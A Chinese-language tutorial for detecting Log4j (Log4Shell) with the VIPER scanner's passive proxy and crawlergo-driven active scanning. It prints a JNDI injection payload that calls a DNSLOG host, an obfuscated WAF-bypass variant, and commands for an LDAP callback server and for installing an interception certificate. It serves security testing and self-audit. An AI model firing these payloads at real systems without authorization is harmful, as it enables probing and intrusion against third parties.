# 使用VIPER扫描Log4j漏洞(主动扫描/被动扫描)

# 功能特性

## 被动扫描

+ 自动替换GET请求参数为Payload
+ 自动替换POST请求参数为Payload
+ 自动替换POST请求JSON中值为Payload
+ 自动替换跳过密码字段
+ 自动在headers中添加Payload(依据字典轮询)
+ Payload包含原始Payload与绕过WAF的Payload
+ 支持DNSLOG与LDAPServer两种回连模式(LDAPServer更适用于内网自查)

```plain
${jndi:ldap://ed3bf69b5e9611ec.xxx.ceye.io/hi}

${${c:Xy:-j}${Kp:W:q:-n}${dzD:-d}${UQt:-i}${GT:-:}${s:hzr:e:-l}${e:ZSJ:yd:-d}${fA:kBl:c:-a}${Hbn:q:-p}${f:Uu:-:}${HOB:-/}${Ijk:E:-/}${dfG:-e}${F:dSj:JE:-d}${Z:-3}${BOI:Yrf:-b}${Yt:S:-f}${DKB:-6}}${Z:-b}${xdB:XBZ:-5}${dW:-e}${uC:-6}${OC:KVJ:j:-1}${L:o:-1}${jhr:-e}${d:-c}${Gi:nUE:AX:-.}${vuo:hy:Srz:-9}${xv:-f}${KG:-p}${xm:-p}${My:aQw:-b}${Mz:Xr:-j}${Z:wWt:-.}${Kx:D:-c}${Y:-e}${j:-y}${xOm:-e}${Cn:-.}${N:Tx:de:-i}${hT:h:P:-o}${qi:yx:i:-/}${j:-h}${Qfp:-i}}
```

+ Payload中包含UUID,可根据DNSLOG记录查找具体触发漏洞的请求内容

## 主动扫描

+ 通过chrome headless + 爬虫的方式获取自动获取页面所有请求,将请求导入到被动proxy中,实现自动化扫描
+ 命令

```plain
.\crawlergo.exe -c ./chrome.exe -t 3 --push-to-proxy http://viperip:28888 http://target.com
```

# 使用教程

## 被动扫描

+ 更新VIPER版本到`v1.5.10`
+ 启动VIPER

![1639676983773-2a6830c4-eea5-4995-92f4-a73706fc5864.webp](./img/c0meLUd67I2xejnp/1639676983773-2a6830c4-eea5-4995-92f4-a73706fc5864-063191.webp)

+ 将浏览器代理设置为viperip:28888

![1639677135625-073dee2c-691f-4e16-a326-531b7c26f2b4.webp](./img/c0meLUd67I2xejnp/1639677135625-073dee2c-691f-4e16-a326-531b7c26f2b4-008901.webp)

+ 开启`被动扫描`中Log4j2模块

![1640007481033-26813815-236e-4a14-8892-29b203e9a03e.webp](./img/c0meLUd67I2xejnp/1640007481033-26813815-236e-4a14-8892-29b203e9a03e-373377.webp)

![1640007561651-b321d10c-9883-4930-8559-54fb0af2eba7.webp](./img/c0meLUd67I2xejnp/1640007561651-b321d10c-9883-4930-8559-54fb0af2eba7-726991.webp)

![1640007582128-92a6241c-f2b8-4c45-bc3c-dadc02a9ec4b.webp](./img/c0meLUd67I2xejnp/1640007582128-92a6241c-f2b8-4c45-bc3c-dadc02a9ec4b-088978.webp)

+ 通过浏览器打开目标网站,随意点击,输入信息等

![1639677273615-41f05455-b87e-491c-b993-3b934acfa646.webp](./img/c0meLUd67I2xejnp/1639677273615-41f05455-b87e-491c-b993-3b934acfa646-144672.webp)![1639677289481-de3c8d9f-814d-46eb-889d-46847f552404.webp](./img/c0meLUd67I2xejnp/1639677289481-de3c8d9f-814d-46eb-889d-46847f552404-170675.webp)

![1639677305436-4c12539d-2dfa-451a-a0de-25919c84f0db.webp](./img/c0meLUd67I2xejnp/1639677305436-4c12539d-2dfa-451a-a0de-25919c84f0db-024025.webp)

+ VIPER后台会自动替换输入的值为Payload
+ 登录DNSlog平台,观察是否有记录

![1639677403210-eebfb09a-ffa9-4af6-99cc-51d8fcd5df22.webp](./img/c0meLUd67I2xejnp/1639677403210-eebfb09a-ffa9-4af6-99cc-51d8fcd5df22-007917.webp)

+ 拷贝红框中的uuid信息,在主页面查询

![1639677446002-dd4334ea-9374-4120-bd2a-840130a7c148.webp](./img/c0meLUd67I2xejnp/1639677446002-dd4334ea-9374-4120-bd2a-840130a7c148-776102.webp)

![1639677468915-79dd91a6-bee1-4a2d-a4c5-4be05425a5dc.webp](./img/c0meLUd67I2xejnp/1639677468915-79dd91a6-bee1-4a2d-a4c5-4be05425a5dc-909468.webp)

+ 查询结果中包含可以触发漏洞的具体请求

![1639677504286-6361196e-c781-4c0c-8d22-fe65cca95741.webp](./img/c0meLUd67I2xejnp/1639677504286-6361196e-c781-4c0c-8d22-fe65cca95741-420030.webp)

## 主动扫描

+ 更新VIPER版本到`v1.5.10`
+ 启动VIPER

![1639676983773-2a6830c4-eea5-4995-92f4-a73706fc5864.webp](./img/c0meLUd67I2xejnp/1639676983773-2a6830c4-eea5-4995-92f4-a73706fc5864-063191.webp)

+ 开启`被动扫描`中Log4j2模块

![1640007481033-26813815-236e-4a14-8892-29b203e9a03e.webp](./img/c0meLUd67I2xejnp/1640007481033-26813815-236e-4a14-8892-29b203e9a03e-373377.webp)

![1640007561651-b321d10c-9883-4930-8559-54fb0af2eba7.webp](./img/c0meLUd67I2xejnp/1640007561651-b321d10c-9883-4930-8559-54fb0af2eba7-726991.webp)

![1640007582128-92a6241c-f2b8-4c45-bc3c-dadc02a9ec4b.webp](./img/c0meLUd67I2xejnp/1640007582128-92a6241c-f2b8-4c45-bc3c-dadc02a9ec4b-088978.webp)

+ 这里假设准备测试的网站为[http://target.com](http://target.com)
+ 安装crawlergo  [https://github.com/Qianlitp/crawlergo](https://github.com/Qianlitp/crawlergo)
+ 启动爬虫,并将流量发送到VIPER的代理中

```plain
.\crawlergo.exe -c ./chrome.exe -t 3 --push-to-proxy http://viperip:28888 http://target.com
```

+ 等待爬虫结束
+ 登录DNSlog平台,观察是否有记录

![1639677909294-5a0ce514-7fc1-4eba-a06c-ba1e70453d57.webp](./img/c0meLUd67I2xejnp/1639677909294-5a0ce514-7fc1-4eba-a06c-ba1e70453d57-465890.webp)

+ 拷贝红框中的uuid信息,在主页面查询

![1639677446002-dd4334ea-9374-4120-bd2a-840130a7c148.webp](./img/c0meLUd67I2xejnp/1639677446002-dd4334ea-9374-4120-bd2a-840130a7c148-776102.webp)

![1639677960256-d7832c7d-ba45-49b0-9e7c-f3f15c4bc928.webp](./img/c0meLUd67I2xejnp/1639677960256-d7832c7d-ba45-49b0-9e7c-f3f15c4bc928-469705.webp)

+ 查询结果中包含可以触发漏洞的具体请求(<font style="color:#E8323C;">该请求为Crawlergo自动发送</font>)

![1639677996654-e07b5fc3-83ab-4cc4-9e06-5873ffe08e4d.webp](./img/c0meLUd67I2xejnp/1639677996654-e07b5fc3-83ab-4cc4-9e06-5873ffe08e4d-756568.webp)

## 使用LDAPServer回连

+ 更新VIPER版本到`v1.5.10`
+ 启动VIPER

![1639676983773-2a6830c4-eea5-4995-92f4-a73706fc5864.webp](./img/c0meLUd67I2xejnp/1639676983773-2a6830c4-eea5-4995-92f4-a73706fc5864-063191.webp)

+ 将浏览器代理设置为viperip:28888

![1639677135625-073dee2c-691f-4e16-a326-531b7c26f2b4.webp](./img/c0meLUd67I2xejnp/1639677135625-073dee2c-691f-4e16-a326-531b7c26f2b4-008901.webp)

+ 开启`被动扫描`中Log4j2模块

![1640007481033-26813815-236e-4a14-8892-29b203e9a03e.webp](./img/c0meLUd67I2xejnp/1640007481033-26813815-236e-4a14-8892-29b203e9a03e-373377.webp)

+ 这里配置DNSLOG为`VPSIP:1387`

![1640008354670-f9ac3585-bd61-4118-89b4-cadf5c83f5bd.webp](./img/c0meLUd67I2xejnp/1640008354670-f9ac3585-bd61-4118-89b4-cadf5c83f5bd-453844.webp)

+ 执行如下命令,开启VIPER内置的LDAPServer

```plain
docker exec -it viper-c bash
python3 /root/viper/STATICFILES/Tools/ldapserver.py -p 1387
```

![1640008517473-73cc7623-a384-4a90-8717-f060f2508a8e.webp](./img/c0meLUd67I2xejnp/1640008517473-73cc7623-a384-4a90-8717-f060f2508a8e-858707.webp)

+ 通过浏览器打开目标网站,随意点击,输入信息等

![1639677273615-41f05455-b87e-491c-b993-3b934acfa646.webp](./img/c0meLUd67I2xejnp/1639677273615-41f05455-b87e-491c-b993-3b934acfa646-144672.webp)![1639677289481-de3c8d9f-814d-46eb-889d-46847f552404.webp](./img/c0meLUd67I2xejnp/1639677289481-de3c8d9f-814d-46eb-889d-46847f552404-170675.webp)

![1639677305436-4c12539d-2dfa-451a-a0de-25919c84f0db.webp](./img/c0meLUd67I2xejnp/1639677305436-4c12539d-2dfa-451a-a0de-25919c84f0db-024025.webp)

+ VIPER后台会自动替换输入的值为Payload
+ LDAPServer会收到回连请求,并打印请求UUID

![1640008583769-e8764e31-f65d-4a1a-915b-ea98e0e5329f.webp](./img/c0meLUd67I2xejnp/1640008583769-e8764e31-f65d-4a1a-915b-ea98e0e5329f-293139.webp)

+ 拷贝红框中的uuid信息,在主页面查询

![1639677446002-dd4334ea-9374-4120-bd2a-840130a7c148.webp](./img/c0meLUd67I2xejnp/1639677446002-dd4334ea-9374-4120-bd2a-840130a7c148-776102.webp)

![1639677468915-79dd91a6-bee1-4a2d-a4c5-4be05425a5dc.webp](./img/c0meLUd67I2xejnp/1639677468915-79dd91a6-bee1-4a2d-a4c5-4be05425a5dc-909468.webp)

+ 查询结果中包含可以触发漏洞的具体请求

![1639677504286-6361196e-c781-4c0c-8d22-fe65cca95741.webp](./img/c0meLUd67I2xejnp/1639677504286-6361196e-c781-4c0c-8d22-fe65cca95741-420030.webp)

##  

## 测试HTTPS网站

+ 更新VIPER版本到`v1.5.10`
+ 启动VIPER

![1639676983773-2a6830c4-eea5-4995-92f4-a73706fc5864.webp](./img/c0meLUd67I2xejnp/1639676983773-2a6830c4-eea5-4995-92f4-a73706fc5864-063191.webp)

+ 将浏览器代理设置为viperip:28888

![1639677135625-073dee2c-691f-4e16-a326-531b7c26f2b4.webp](./img/c0meLUd67I2xejnp/1639677135625-073dee2c-691f-4e16-a326-531b7c26f2b4-008901.webp)

+ 浏览器打开[http://mitm.it/](http://mitm.it/)

![1639696317934-338d50cf-82c6-49fb-84b4-4d0baf6528b5.webp](./img/c0meLUd67I2xejnp/1639696317934-338d50cf-82c6-49fb-84b4-4d0baf6528b5-374355.webp)

+ 下载对应平台的证书,并安装(以windows为例)

![1639696364644-f1f5e3fd-c8c5-4323-87b4-d0677180b9d8.webp](./img/c0meLUd67I2xejnp/1639696364644-f1f5e3fd-c8c5-4323-87b4-d0677180b9d8-202132.webp)

![1639696384299-3f0cc650-37a0-477f-86a8-e5a9f8340303.webp](./img/c0meLUd67I2xejnp/1639696384299-3f0cc650-37a0-477f-86a8-e5a9f8340303-311428.webp)

![1639696408673-45214402-b293-490b-9501-44b788e7c51c.webp](./img/c0meLUd67I2xejnp/1639696408673-45214402-b293-490b-9501-44b788e7c51c-622270.webp)

![1639696428593-9a01fe22-1175-443f-931a-fced91cff627.webp](./img/c0meLUd67I2xejnp/1639696428593-9a01fe22-1175-443f-931a-fced91cff627-087380.webp)

+ 不用填写信息

![1639696451109-d0ce0d93-e659-4063-ae60-83301e543a4f.webp](./img/c0meLUd67I2xejnp/1639696451109-d0ce0d93-e659-4063-ae60-83301e543a4f-708620.webp)

+ 这里要选择受信任的根证书

![1639696486793-5d40d1b7-b810-4990-a170-60c7feeaf3d5.webp](./img/c0meLUd67I2xejnp/1639696486793-5d40d1b7-b810-4990-a170-60c7feeaf3d5-170335.webp)

![1639696514496-7bf25cab-8b7b-41ef-98ea-ad7cacd45d8b.webp](./img/c0meLUd67I2xejnp/1639696514496-7bf25cab-8b7b-41ef-98ea-ad7cacd45d8b-218541.webp)

+ 请在测试结束后从系统配置中删除对应的证书



